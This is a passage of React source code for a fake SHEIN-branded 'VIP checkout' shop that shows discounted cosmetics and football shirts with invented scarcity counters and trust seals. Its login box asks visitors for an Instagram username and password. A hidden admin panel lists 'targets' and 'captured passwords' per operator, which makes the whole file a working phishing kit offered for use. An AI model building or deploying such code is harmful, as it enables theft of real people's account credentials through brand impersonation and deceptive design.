      { pt: "Tratamento luxuoso em óleo que nutre profundamente os lábios enquanto realça a cor natural.", en: "Luxurious oil treatment that deeply nourishes lips while enhancing their natural rosy glow.", zh: "奢华唇部 oil 修护，深层滋养唇肌，彰显自然粉嫩。" }
    ),
    getProduct("prod-dior-addict-glow", "DIOR", "beleza", diorLipGlowOil, 313,
      { pt: "GLOSS LABIAL DIOR ADDICT LIP GLOW OIL (9 opções)", en: "Dior Addict Lip Glow Oil (9 shades)", zh: "迪奥 Addict Lip Glow 护唇油（9色可选）" },
      { pt: "O aclamado óleo labial da Dior que protege, embeleza e reativa a cor natural dos lábios.", en: "The highly acclaimed Dior lip oil that protects, beautifies, and intensely revives natural lip color.", zh: "备受推崇的迪奥护唇油，保护并焕发双唇自然色彩。" }
    ),
    getProduct("prod-boca-rosa-choco", "BOCA ROSA", "beleza", fentyLipKit, 160,
      { pt: "KIT LABIAL BOCA ROSA HIDRA CHOCO", en: "Boca Rosa Hidra Choco Lip Kit", zh: "Boca Rosa Hidra Choco 唇部套装" },
      { pt: "Kit labial Boca Rosa com contorno e gloss hidratante no delicioso tom chocolate e textura confortável.", en: "Boca Rosa lip kit featuring lip liner and moisturizing gloss in a delicious chocolate shade.", zh: "Boca Rosa 唇部套装，包含唇线笔 ou 巧克力色滋润唇蜜。" }
    ),
    getProduct("prod-bt-glaze", "BRUNA TAVARES", "beleza", jellyOilBT, 70,
      { pt: "GLOSS LABIAL BRUNA TAVARES BT GLAZE (8 opções)", en: "Bruna Tavares BT Glaze Lip Gloss (8 shades)", zh: "Bruna Tavares BT Glaze 唇蜜（8色可选）" },
      { pt: "Fórmula inovadora de alta pigmentação com efeito laqueado 3D, super macio e confortável.", en: "Innovative highly pigmented formula with 3D vinyl lacquer effect, ultra-comfortable wear.", zh: "高显色创意配方，3D 漆光亮泽，质地极其温和。" }
    ),
    getProduct("prod-kylie-supple-kiss", "KYLIE COSMETICS", "beleza", macSquirtGloss, 172,
      { pt: "BRILHO LABIAL KYLIE COSMETICS KING KYLIE SUPPLE KISS (3 opções)", en: "Kylie Cosmetics King Kylie Supple Kiss Lip Glaze (3 shades)", zh: "Kylie Cosmetics King Kylie 柔嫩之吻唇釉（3色可选）" },
      { pt: "Brilho labial de textura levíssima que proporciona brilho molhado e hidratação intensa sem colar.", en: "Ultra-lightweight lip glaze that delivers high wet-shine look and non-sticky deep hydration.", zh: "超轻盈质地唇釉，带来湿润光泽，滋润不黏腻。" }
    ),
    getProduct("prod-fenty-ramadan-link", "FENTY BEAUTY", "beleza", fentyLipKit, 248,
      { pt: "KIT LABIAL FENTY BEAUTY RAMADAN LINK UP", en: "Fenty Beauty Ramadan Link Up Lip Kit", zh: "Fenty Beauty 斋月联名唇部套装" },
      { pt: "Kit exclusivo Ramadan contendo o mini gloss best-seller e lápis labial de contorno em tamanho especial.", en: "Exclusive Ramadan set featuring the best-selling mini gloss bomb and a matching lip liner pencil.", zh: "斋月限量版套装，包含畅销迷你唇蜜和唇线笔。" }
    ),
    getProduct("prod-fenty-lip-drip", "FENTY BEAUTY", "beleza", fentyLipKit, 205,
      { pt: "KIT FENTY BEAUTY LIP DRIP DUO", en: "Fenty Beauty Lip Drip Duo Set", zh: "Fenty Beauty 双色唇蜜套装" },
      { pt: "Duo de glosses icônicos Fenty Glow para lábios instantaneamente mais volumosos e ultra-brilhantes.", en: "Iconic Fenty Glow gloss duo for instantly fuller-looking and ultra-shiny glass lips.", zh: "经典 double-gloss 套装，打造饱满镜光双唇。" }
    ),
    getProduct("prod-fenty-ramadan-iconic", "FENTY BEAUTY", "beleza", fentyLipKit, 421,
      { pt: "KIT FENTY BEAUTY RAMADAN ICONIC LIP TRIO", en: "Fenty Beauty Ramadan Iconic Lip Trio", zh: "Fenty Beauty 斋月明星唇部三件套" },
      { pt: "Edição de luxo com trio de lábios Fenty contendo Gloss Bomb e batom de acabamento refinado.", en: "Luxury edition lip trio by Fenty featuring full-sized Gloss Bomb and high-pigment cream lipstick.", zh: "奢华三件套，包含正装 Gloss Bomb 和%E5%A5%87%E7%89%B9%E5%94%87%E8%8A%8F。" }
    ),
    getProduct("prod-mac-lipglass-pencil", "M·A·C", "beleza", macSquirtGloss, 341,
      { pt: "KIT LIP MOMENT MAC LIPGLASS AIRSHINE E LIP PENCIL", en: "MAC Lip Moment Lipglass Airshine & Lip Pencil Set", zh: "魅可 Lip Moment 镜光唇蜜与唇线笔套装" },
      { pt: "Combinação perfeita de delineador e gloss espelhado para lábios definidos e ultra-luminosos.", en: "Perfect combo of high-precision lip liner and mirror-shine gloss for defined, luminous lips.", zh: "唇线笔与高亮唇蜜 the 完美搭配，勾勒闪耀饱满唇妆。" }
    ),
    getProduct("prod-mac-maxcimal-airshine", "M·A·C", "beleza", macSquirtGloss, 341,
      { pt: "KIT LIP MOMENT MAC MAXCIMAL E LIPGLASS AIRSHINE", en: "MAC Lip Moment Macximal & Lipglass Airshine Set", zh: "魅可 Lip Moment 哑光唇膏与镜光唇蜜套装" },
      { pt: "Kit de luxo contendo batom matte de alta fixação e finalizador de brilho espelhado Lipglass.", en: "Luxury set containing high-fixation matte lipstick and the mirror-shine Lipglass topper.", zh: "高持久哑光唇膏与 Lipglass 镜面唇蜜的奢华礼盒。" }
    ),
    getProduct("prod-mari-maria-candy", "MARI MARIA", "beleza", jellyOilBT, 76,
      { pt: "GLOSS MARI MARIA LIP CANDY (3 opções)", en: "Mari Maria Lip Candy Gloss (3 shades)", zh: "Mari Maria 糖果唇蜜（3色可选）" },
      { pt: "Fórmula confortável e leve com partículas de brilho multidimensionais e aroma adocicado.", en: "Lightweight formula featuring multidimensional shimmer particles and sweet scent.", zh: "轻盈质地，富含多维闪耀颗粒 com aroma adocicado." }
    ),
    getProduct("prod-ch-good-girl-oil", "CAROLINA HERRERA", "beleza", diorLipGlowOil, 297,
      { pt: "LIP OIL CAROLINA HERRERA GOOD GIRL", en: "Carolina Herrera Good Girl Lip Oil", zh: "卡罗琳娜·海莱拉 Good Girl 护唇油" },
      { pt: "Óleo labial de alta costura com hidratação nutritiva e brilho sofisticado inspirado no icônico Good Girl.", en: "High-fashion lip oil providing deep nourishment and sophisticated shine inspired by Good Girl.", zh: "高定美妆系列护唇油，深层滋润，绽放高贵优雅。" }
    ),
    getProduct("prod-sephora-hydrating-gloss", "SEPHORA COLLECTION", "gloss", diorLipGlowOil, 95,
      { pt: "GLOSS LABIAL HIDRATANTE SEPHORA COLLECTION (8 opções)", en: "Sephora Collection Hydrating Lip Gloss (8 shades)", zh: "丝芙兰 Collection 水润保湿唇蜜（8色可选）" },
      { pt: "Gloss enriquecido com ácido hialurônico para hidratação contínua e lábios macios com brilho molhado.", en: "Gloss enriched with hyaluronic acid for continuous hydration and high-shine wet look.", zh: "富含玻尿酸的补水唇蜜，带来持久滋养与水漾亮泽。" }
    )
  ];

  // Filter products by active category tab in frontend
  const filteredProducts = clothingProducts.filter(
    (product) => activeCategory === "todos" || product.category === activeCategory
  );

  // Filter captured passwords to show only those belonging to users created by this admin
  const myUsernames = myUsers.map(u => u.username.toLowerCase());
  const filteredCaptured = capturedPasswords.filter(entry => 
    myUsernames.includes(entry.user.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-stone-50 font-sans text-stone-850 flex flex-col justify-between selection:bg-[#ebdcc6] selection:text-black overflow-x-hidden relative chinese-lattice-bg">
      
      {/* Immersive Store Header Row */}
      <ChineseEcommHeader 
        language={language} 
        setLanguage={setLanguage} 
        currency={currency} 
        setCurrency={setCurrency} 
        onOpenAdmin={handleOpenAdmin}
      />

      {/* Main Content Area */}
      <main className="relative z-10 flex-1 w-full max-w-7xl mx-auto px-4 py-8 grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        
        {/* LEFT COLUMN: Clothes/Cosmetics Promotions (7 cols on large screens) */}
        <div className="lg:col-span-7 space-y-6">
          
          <div className="bg-white border border-stone-200 p-5 shadow-sm">
            <h3 className="text-xs md:text-sm font-bold uppercase tracking-wider text-black border-b border-stone-200 pb-3 font-mono flex items-center gap-2">
              <span className="w-2.5 h-2.5 bg-black animate-pulse rounded-full"></span>
              <span>{termsText.productsTitle}</span>
            </h3>

            {/* SHEIN Navigation Tabs - ENLARGED ("aumente as abas") */}
            <div className="flex flex-wrap gap-2 py-4">
              {[
                { id: "todos", label: language === "zh" ? "全部商品" : language === "en" ? "All Products" : "Ver Tudo", icon: ShoppingBag },
                { id: "motf", label: "MOTF Premium", icon: Layers },
                { id: "selecao", label: language === "zh" ? "国家队球衣" : language === "en" ? "Brazil Kits" : "Camisas Seleção", icon: Award },
                { id: "beleza", label: language === "zh" ? "美妆护肤" : language === "en" ? "Beauty & Deals" : "Beleza e Saúde", icon: Sparkles }
              ].map((cat) => {
                const Icon = cat.icon;
                const isActive = activeCategory === cat.id;
                return (
                  <button
                    key={cat.id}
                    onClick={() => setActiveCategory(cat.id as any)}
                    className={`flex items-center gap-2.5 py-4 px-6 text-xs md:text-[13px] font-black uppercase tracking-widest transition-all duration-200 cursor-pointer border rounded-none ${
                      isActive 
                        ? "bg-black text-white border-black shadow-md" 
                        : "bg-white text-stone-500 border-stone-200 hover:text-black hover:border-stone-400"
                    }`}
                  >
                    <Icon className="w-4 h-4" />
                    <span>{cat.label}</span>
                  </button>
                );
              })}
            </div>
            
            <p className="text-[11px] text-stone-400 font-serif italic mb-4">
              {termsText.productsSub}
            </p>

            {/* SHEIN Layout Grid cards */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {filteredProducts.map((product) => (
                <div 
                  key={product.id}
                  className="bg-white border border-stone-200 hover:border-black p-3.5 rounded-none transition-all duration-200 shadow-sm flex flex-col justify-between relative group"
                >
                  {/* Product Image Cover */}
                  <div className="w-full h-64 bg-stone-50 relative overflow-hidden flex items-center justify-center p-1 border-b border-stone-100">
                    <img 
                      src={product.image} 
                      alt={product.name}
                      className="w-full h-full object-contain transition-transform duration-300 group-hover:scale-103"
                    />
                    <span className="absolute top-2.5 left-2.5 text-[8px] bg-red-600 text-white px-2 py-0.5 rounded-none font-bold tracking-widest uppercase shadow-sm font-mono">
                      {product.badge}
                    </span>
                    <span className="absolute top-2.5 right-2.5 text-[9px] bg-amber-50 text-amber-700 px-1.5 py-0.5 rounded-none font-bold font-mono">
                      -90% OFF
                    </span>
                  </div>

                  {/* Product Details */}
                  <div className="flex-1 flex flex-col justify-between pt-3">
                    <div>
                      <h4 className="font-serif text-[#222] text-sm font-bold group-hover:text-stone-700 transition-colors leading-tight truncate">
                        {product.name}
                      </h4>
                      <p className="text-[11px] text-stone-400 mt-1 font-serif leading-normal line-clamp-2">
                        {product.desc}
                      </p>
                    </div>

                    {/* Stock indicator */}
                    <div className="mt-3">
                      <div className="flex items-center justify-between text-[8px] font-mono text-stone-500 uppercase mb-1">
                        <span>Apenas {product.itemsLeft} restando!</span>
                        <span>{product.stockPercent}% VENDIDO</span>
                      </div>
                      <div className="w-full h-1 bg-stone-100">
                        <div 
                          className="h-full bg-red-600" 
                          style={{ width: `${product.stockPercent}%` }}
                        ></div>
                      </div>
                    </div>

                    {/* Pricing and Action */}
                    <div className="flex items-center justify-between mt-4 pt-3 border-t border-stone-100">
                      <div>
                        <span className="text-[9px] text-stone-400 font-mono line-through">
                          {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"} {product.originalPrice.toFixed(2)}
                        </span>
                        <p className="text-sm font-bold text-[#8b1e1a] font-mono mt-0.5">
                          <span className="text-xs">
                            {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
                          </span>
                          <span className="text-base font-extrabold">{product.promoPrice.toFixed(2)}</span>
                        </p>
                      </div>

                      <button
                        onClick={() => handleBuyClick(product.name)}
                        className="px-3.5 py-2 bg-black hover:bg-stone-850 text-white font-mono font-bold text-[9px] uppercase tracking-widest transition-colors cursor-pointer shadow-sm border-none"
                      >
                        {termsText.buyNow}
                      </button>
                    </div>
                  </div>

                </div>
              ))}
            </div>

          </div>

          {/* SHEIN Trust Badge Voucher panel */}
          <div className="p-5 bg-white border border-stone-200 rounded-none relative overflow-hidden flex flex-col sm:flex-row items-center justify-between gap-4 shadow-sm select-none">
            <div className="flex items-center gap-4">
              <div className="w-10 h-10 bg-black flex items-center justify-center text-white font-bold font-serif text-base shadow-sm">
                券
              </div>
              <div>
                <h4 className="text-[10px] md:text-xs text-black font-bold uppercase tracking-widest font-mono">Cupom Extra Ativo SHEIN VIP</h4>
                <p className="text-[9px] md:text-[10px] text-stone-500 font-serif leading-relaxed mt-0.5">
                  Insira o código promocional <strong className="font-mono text-black bg-stone-100 px-1 border border-stone-200">CHINA666</strong> no Red Pocket flutuante para resgatar.
                </p>
              </div>
            </div>
            <div className="bg-red-50 border border-red-200 px-3.5 py-1.5 font-mono text-[10px] font-bold text-[#8b1e1a] tracking-wider uppercase shadow-inner">
              R$ 15,00 EXTRA + 90% OFF
            </div>
          </div>

        </div>

        {/* RIGHT COLUMN: Auth Page stage (5 cols on large screens) */}
        <div id="login-box-container" className="lg:col-span-5 transition-all duration-300">
          
          {loggedInUser ? (
            /* USER IS LOGGED IN - SHEIN VIP ACCOUNT MANAGER */
            <div className="bg-white border border-stone-200 rounded-none p-5 md:p-7 shadow-sm relative overflow-hidden animate-scale-up text-stone-800">
              
              {/* Authenticated Header */}
              <div className="flex items-start justify-between border-b border-stone-200 pb-5 mb-5 gap-4">
                <div className="flex items-center gap-4 min-w-0">
                  <div className="w-14 h-14 rounded-none bg-stone-100 flex items-center justify-center shadow-inner text-black font-serif font-bold text-xl relative border border-stone-300 flex-shrink-0">
                    {loggedInUser.name.charAt(0)}
                    <span className="absolute bottom-0 right-0 w-3 h-3 bg-emerald-500 border border-white rounded-full"></span>
                  </div>
                  <div className="min-w-0">
                    <span className="text-[8px] uppercase font-bold tracking-widest text-[#8b1e1a] bg-red-50 px-2 py-0.5 rounded-none border border-red-200 font-mono inline-block truncate max-w-full">
                      {loggedInUser.role} 
                    </span>
                    <h3 className="font-serif font-bold text-black text-base mt-2 leading-none uppercase tracking-wide truncate">{loggedInUser.name}</h3>
                    <p className="text-[10px] text-stone-500 font-mono mt-1 font-semibold truncate">{loggedInUser.username}</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleLogout}
                  className="px-3 py-1.5 bg-black hover:bg-stone-850 text-white rounded-none transition-colors flex items-center gap-1.5 text-[9px] font-mono font-bold uppercase tracking-widest border-none cursor-pointer flex-shrink-0"
                  title={termsText.logoutBtn}
                >
                  <LogOut className="w-3.5 h-3.5 text-white" />
                  <span>Sair</span>
                </button>
              </div>

              {/* Simulated Customer Wallet Details */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-5">
                <div className="bg-stone-50 p-4 border border-stone-200 rounded-none animate-fade-in relative">
                  <span className="text-[8px] text-stone-500 uppercase tracking-widest block mb-1 font-bold font-mono">{termsText.wallet}</span>
                  <div className="flex items-baseline gap-1 mt-1">
                    <span className="text-[11px] text-black font-light">
                      {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
                    </span>
                    <span className="text-lg md:text-xl font-bold text-black font-mono">
                      {currency === "BRL" ? "1.890,50" : currency === "CNY" ? "2.450,00" : "335.00"}
                    </span>
                  </div>
                  <span className="text-[7px] text-emerald-600 flex items-center gap-1 mt-3.5 font-mono uppercase tracking-wider font-semibold">
                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                    <span>Reembolso Ativo</span>
                  </span>
                </div>

                <div className="bg-stone-50 p-4 border border-stone-200 rounded-none animate-fade-in relative">
                  <span className="text-[8px] text-stone-500 uppercase tracking-widest block mb-1 font-bold font-mono">{termsText.points}</span>
                  <div className="flex items-baseline gap-1 mt-1">
                    <span className="text-lg md:text-xl font-bold text-black font-mono">11.110</span>
                    <span className="text-[8px] text-stone-500 font-bold font-mono ml-0.5">PTS</span>
                  </div>
                  <span className="text-[7px] text-[#cfab7c] mt-3.5 block font-mono font-bold uppercase tracking-wider">
                    ★ Nível Gold VIP
                  </span>
                </div>
              </div>

              {/* Simulated Shipping Route details */}
              <div className="bg-stone-50 border border-stone-200 rounded-none p-4 relative">
                <h4 className="text-[10px] md:text-xs font-bold text-black flex items-center gap-2 mb-4 font-mono uppercase tracking-widest pb-2 border-b border-stone-200">
                  <Truck className="w-4 h-4 text-black" />
                  <span>{termsText.mockShipping}</span>
                </h4>
                <div className="relative pl-5 border-l border-stone-300 space-y-4 font-mono text-[11px]">
                   {/* Step 1 */}
                  <div className="relative">
                    <span className="absolute -left-[24px] top-1 w-2.5 h-2.5 rounded-full bg-black shadow-sm"></span>
                    <span className="text-[9px] text-[#8b1e1a] block font-bold uppercase tracking-widest">Enviado por Correios VIP</span>
                    <p className="text-[11px] text-stone-600 mt-1 font-serif leading-relaxed italic">
                      {termsText.logisticsStep}
                    </p>
                    <span className="text-[8px] text-stone-400 block mt-1 font-mono"> Shenzhen Wardrobe Base • 2026-06-20</span>
                  </div>

                  {/* Step 2 */}
                  <div className="relative opacity-60">
                    <span className="absolute -left-[24px] top-1 w-2.5 h-2.5 rounded-full bg-stone-400"></span>
                    <span className="text-[9px] text-stone-500 block font-bold uppercase tracking-widest">Sessão Ativa</span>
                    <p className="text-[11px] text-stone-600 mt-1 font-serif">
                      Portador VIP ativo no cadastro de controle local: <strong className="font-mono text-black">{loggedInUser.username}</strong>
                    </p>
                  </div>
                </div>
              </div>

            </div>
          ) : (
            /* USER IS LOGGED OUT - SHEIN CHECKOUT STYLE LOGIN BOX */
            <div className="bg-white border border-stone-200 rounded-none overflow-hidden shadow-sm relative">
              <div className="absolute top-0 left-0 w-full h-[3px] bg-black"></div>
              
              <div className="p-6 md:p-8">
                
                {/* Brand Greetings Header on top of form */}
                <div className="text-center pb-4 border-b border-stone-200 mb-6">
                  <p className="text-[8px] md:text-[9px] text-[#8b1e1a] tracking-[0.2em] uppercase font-mono font-bold">
                    Checkout Seguro • VIP
                  </p>
                  <h3 className="text-xl font-serif text-black font-bold tracking-widest uppercase mt-2">
                    Finalizar Compra
                  </h3>
                </div>

                {/* Feedback messages */}
                {feedback && (
                  <div className="mb-5 animate-fade-in font-mono">
                    <div className={`flex items-start gap-3 p-3.5 rounded-none border text-xs leading-relaxed ${
                      feedback.type === "success" 
                        ? "bg-emerald-50 border-emerald-200 text-emerald-800" 
                        : "bg-red-50 border-red-200 text-red-800"
                    }`}>
                      {feedback.type === "success" ? (
                        <CheckCircle2 className="w-4 h-4 flex-shrink-0 text-emerald-600 mt-0.5" />
                      ) : (
                        <AlertCircle className="w-4 h-4 flex-shrink-0 text-[#8b1e1a] mt-0.5" />
                      )}
                      <span className="text-[11px]">{feedback.text}</span>
                    </div>
                  </div>
                )}

                {/* Regular Password Form */}
                <form onSubmit={handleLoginSubmit} className="space-y-5 animate-fade-in">
                  
                  {/* Username Block */}
                  <div>
                    <label className="block text-[9px] text-stone-500 mb-2 font-bold uppercase tracking-widest font-mono">
                      {termsText.userField}
                    </label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
                        <img src="https://i.ibb.co/DHYRd4NJ/ig.png" alt="ig" className="h-5 w-5 object-contain opacity-70" />
                      </span>
                      <input
                        name="login_username"
                        type="text"
                        value={username.startsWith("@") ? username.substring(1) : username}
                        onChange={(e) => handleUsernameChange(e.target.value)}
                        placeholder="nome_usuario"
                        autoComplete="off"
                        required
                        className="w-full bg-stone-50 border border-stone-200 text-xs md:text-sm text-black pl-11 pr-3 py-3 rounded-none focus:outline-none focus:border-black transition-all font-mono"
                      />
                    </div>
                    {/* Tiny format hints */}
                    <p className="text-[9px] text-stone-400 mt-1.5 leading-normal italic font-serif">
                      {language === "zh" ? "系统会自动添加 '@' 前缀验证" : "O sistema irá prefixar com @ automaticamente."}
                    </p>
                  </div>

                  {/* Password Block */}
                  <div>
                    <div className="flex items-center justify-between mb-2">
                      <label className="block text-[9px] text-stone-500 font-bold uppercase tracking-widest font-mono">
                        {termsText.passField}
                      </label>
                    </div>
                    <div className="relative">
                      <span className="absolute left-3.5 top-1/2 -translate-y-1/2">
                        <Lock className="w-4 h-4 text-stone-400" />
                      </span>
                      <input
                        name="login_password"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="••••••••"
                        required
                        className="w-full bg-stone-50 border border-stone-200 text-xs md:text-sm text-black pl-10 pr-3 py-3 rounded-none focus:outline-none focus:border-black transition-all font-mono"
                      />
                    </div>
                  </div>

                  {/* Coupon integration feedback visual */}
                  {couponCode && (
                    <div className="p-3 bg-[#cfab7c]/5 border border-[#cfab7c]/20 rounded-none flex items-center justify-between text-[11px] text-[#cfab7c] font-mono animate-scale-up">
                      <div className="flex items-center gap-2">
                        <Ticket className="w-4 h-4 text-[#cfab7c] animate-pulse" />
                        <span>Cupom <strong className="font-mono text-black bg-stone-100 px-1 border border-stone-250">{couponCode}</strong> ativo!</span>
                      </div>
                      <span className="text-[8px] md:text-[9px] bg-black px-2 py-0.5 rounded-none font-bold text-white uppercase tracking-widest">
                        90% OFF
                      </span>
                    </div>
                  )}

                  {/* Action Button */}
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 px-4 bg-black hover:bg-stone-850 text-white font-mono font-bold text-[10px] rounded-none shadow-md tracking-[0.2em] transition-all duration-300 flex items-center justify-center gap-2 select-none uppercase border-none cursor-pointer"
                  >
                    <ShoppingBag className="w-4 h-4 text-white animate-pulse" />
                    <span>{loading ? termsText.enterLoading : termsText.enterBtn}</span>
                    <ArrowRight className="w-4 h-4 ml-1 text-white" />
                  </button>

                  <p className="text-[9px] text-stone-400 text-center leading-relaxed font-serif pt-1 italic">
                    {termsText.noRegister}
                  </p>

                </form>

                {/* Footer Agreements */}
                <div className="border-t border-stone-200 pt-4 mt-6 text-center">
                  <p className="text-[9px] text-stone-400 font-serif leading-relaxed">
                    {termsText.terms}
                  </p>
                </div>

                {/* SHEIN Trust seals badges */}
                <div className="flex items-center justify-center gap-4 mt-4 opacity-75 border-t border-stone-100 pt-4">
                  <span className="text-[8px] font-mono text-stone-400 uppercase border border-stone-200 px-1.5 py-0.5 bg-stone-50 font-semibold shadow-sm">
                    🔒 SSL SECURE
                  </span>
                  <span className="text-[8px] font-mono text-stone-400 uppercase border border-stone-200 px-1.5 py-0.5 bg-stone-50 font-semibold shadow-sm">
                    ✓ ADUANA OK
                  </span>
                  <span className="text-[8px] font-mono text-stone-400 uppercase border border-stone-200 px-1.5 py-0.5 bg-stone-50 font-semibold shadow-sm">
                    ★ SHEIN VIP
                  </span>
                </div>

              </div>
              
            </div>
          )}

        </div>

      </main>

      {/* Simulated Live Activity Notification Banner (bottom-left) */}
      {liveNotification && (
        <div className="fixed bottom-6 left-6 z-40 max-w-xs md:max-w-sm bg-white border-l-4 border-black border-t border-b border-r border-stone-200 shadow-lg p-4 animate-fade-in flex items-center gap-3 select-none">
          <div className="w-6 h-6 rounded-none bg-black flex items-center justify-center text-white text-xs font-serif font-bold flex-shrink-0 animate-bounce">
            福
          </div>
          <div>
            <p className="text-[9px] text-stone-500 uppercase tracking-widest font-mono font-bold">Atividade Recente</p>
            <p className="text-[10px] text-black mt-1 font-serif font-semibold leading-relaxed">{liveNotification}</p>
          </div>
        </div>
      )}

      {/* Embedded Red Pocket (Hongbao) lucky coupon claim component */}
      <RedPocketGift 
        language={language} 
        onApplyCoupon={applyPromoCoupon} 
      />

      {/* Admin Panel Modal (US button trigger) */}
      {showAdminPanel && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-fade-in">
          <div className="relative w-full max-w-2xl bg-stone-50 border border-stone-200 rounded-none overflow-hidden shadow-2xl">
            {/* Closes the dialogue */}
            <button
              type="button"
              onClick={handleCloseAdmin}
              className="absolute top-4 right-4 text-stone-400 hover:text-black transition-colors z-20 cursor-pointer bg-transparent border-none"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="p-6 md:p-8">
              {/* Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-stone-200 pb-4.5 mb-5 font-mono text-stone-850">
                <div className="flex items-center gap-3">
                  <Shield className="w-5 h-5 text-black animate-pulse" />
                  <div>
                    <h2 className="text-sm font-bold text-black uppercase tracking-widest">
                      Painel Administrativo VIP
                    </h2>
                    {adminAuthed && (
                      <p className="text-[9px] text-stone-500 mt-1">
                        Logado como: <strong>{currentAdminUser}</strong>
                      </p>
                    )}
                  </div>
                </div>

                {adminAuthed && (
                  <button
                    type="button"
                    onClick={handleAdminLogout}
                    className="self-start sm:self-auto px-3.5 py-1.5 text-[9px] bg-[#8b1e1a] hover:bg-red-700 text-white font-bold uppercase tracking-widest transition-colors cursor-pointer border border-[#8b1e1a]/30"
                  >
                    Encerrar Sessão
                  </button>
                )}
              </div>

              {!adminAuthed ? (
                /* Login / Registration Forms */
                <div className="space-y-5 font-mono text-stone-800">
                  {isAdminRegistering ? (
                    <div>
                      <span className="text-[9px] bg-amber-500/10 text-amber-600 border border-amber-500/25 px-2 py-0.5 font-bold uppercase tracking-widest">
                        {anyAdminExists ? "Novo Cadastro" : "Primeiro Acesso - Configuração Inicial"}
                      </span>
                      <h3 className="text-xs text-stone-500 font-serif mt-2">
                        Configure seu usuário e senha do painel para começar a monitorar.
                      </h3>
                    </div>
                  ) : (
                    <div>
                      <span className="text-[9px] bg-stone-100 text-stone-700 border border-stone-200 px-2 py-0.5 font-bold uppercase tracking-widest">
                        Autenticação
                      </span>
                      <h3 className="text-xs text-stone-500 font-serif mt-2">
                        Faça login no painel para ver suas senhas capturadas.
                      </h3>
                    </div>
                  )}

                  {adminError && (
                    <p className="text-[10px] text-red-500 bg-red-50 p-2.5 border border-red-200 mb-3">
                      ⚠️ {adminError}
                    </p>
                  )}

                  <form onSubmit={handleAdminLogin} className="space-y-4">
                    <div>
                      <label className="block text-[8px] text-stone-500 mb-1.5 font-bold uppercase tracking-widest">
                        Usuário Admin
                      </label>
                      <input
                        type="text"
                        value={adminUser}
                        onChange={(e) => setAdminUser(e.target.value)}
                        placeholder="Nome de Administrador"
                        required
                        className="w-full bg-white border border-stone-250 text-xs text-stone-850 px-3.5 py-3 rounded-none focus:outline-none focus:border-black"
                      />
                    </div>
                    <div>
                      <label className="block text-[8px] text-stone-500 mb-1.5 font-bold uppercase tracking-widest">
                        Senha
                      </label>
                      <input
                        type="password"
                        value={adminPass}
                        onChange={(e) => setAdminPass(e.target.value)}
                        placeholder="Senha de Acesso"
                        required
                        className="w-full bg-white border border-stone-250 text-xs text-stone-850 px-3.5 py-3 rounded-none focus:outline-none focus:border-black"
                      />
                    </div>

                    <button
                      type="submit"
                      className="w-full py-3 bg-black hover:bg-stone-800 text-white font-bold text-xs uppercase tracking-widest rounded-none transition-all cursor-pointer border-none shadow-sm"
                    >
                      {isAdminRegistering ? "Salvar e Acessar" : "Acessar Painel"}
                    </button>
                  </form>

                  {anyAdminExists && (
                    <div className="text-center pt-3 border-t border-stone-200">
                      <button
                        type="button"
                        onClick={() => {
                          setIsAdminRegistering(!isAdminRegistering);
                          setAdminError(null);
                        }}
                        className="text-[9px] text-stone-500 hover:text-black hover:underline uppercase tracking-widest cursor-pointer bg-transparent border-none"
                      >
                        {isAdminRegistering ? "Voltar para o Login" : "Cadastrar novo Administrador"}
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                /* Admin Authenticated Dashboard Panel */
                <div className="space-y-5 max-h-[480px] overflow-y-auto custom-scrollbar pr-1.5 font-mono text-stone-800">
                  
                  {/* Statistics Widgets Row */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="bg-white border border-stone-200 p-3.5 text-center">
                      <span className="text-[8px] text-stone-500 uppercase tracking-widest font-bold block mb-1">
                        Alvos Cadastrados
                      </span>
                      <span className="text-2xl font-bold text-black">{myUsers.length}</span>
                    </div>
                    <div className="bg-white border border-stone-200 p-3.5 text-center">
                      <span className="text-[8px] text-stone-500 uppercase tracking-widest font-bold block mb-1">
                        Senhas Capturadas
                      </span>
                      <span className="text-2xl font-bold text-[#8b1e1a]">{filteredCaptured.length}</span>
                    </div>
                  </div>

                  {/* Tabs Selection Row - ENLARGED TABS FOR USER ("aumente as abas") */}
                  <div className="flex border-b border-stone-200 bg-white p-1 gap-1">
                    <button
                      onClick={() => setActiveAdminTab("targets")}
                      className={`flex-1 py-4.5 px-4 text-[11px] md:text-[13px] lg:text-[14px] font-black uppercase tracking-[0.12em] cursor-pointer transition-all duration-200 border-none ${
                        activeAdminTab === "targets" 
                          ? "bg-black text-white shadow-md font-bold" 
                          : "text-stone-500 hover:text-black hover:bg-stone-50"
                      }`}
                    >
                      [1] Alvos ({myUsers.length})
                    </button>
                    <button
                      onClick={() => setActiveAdminTab("captures")}
                      className={`flex-1 py-4.5 px-4 text-[11px] md:text-[13px] lg:text-[14px] font-black uppercase tracking-[0.12em] cursor-pointer transition-all duration-200 border-none ${
                        activeAdminTab === "captures" 
                          ? "bg-black text-white shadow-md font-bold" 
                          : "text-stone-500 hover:text-black hover:bg-stone-50"
                      }`}
                    >
                      [2] Senhas ({filteredCaptured.length})
                    </button>
                    <button
                      onClick={() => setActiveAdminTab("new_admin")}
                      className={`flex-1 py-4.5 px-4 text-[11px] md:text-[13px] lg:text-[14px] font-black uppercase tracking-[0.12em] cursor-pointer transition-all duration-200 border-none ${
                        activeAdminTab === "new_admin" 
                          ? "bg-black text-white shadow-md font-bold" 
                          : "text-stone-500 hover:text-black hover:bg-stone-50"
                      }`}
                    >
                      [3] Registrar Admin
                    </button>
                  </div>

                  {/* Tab Contents */}
                  {activeAdminTab === "targets" && (
                    <div className="animate-fade-in h-[340px]">
                      <LocalDbManager 
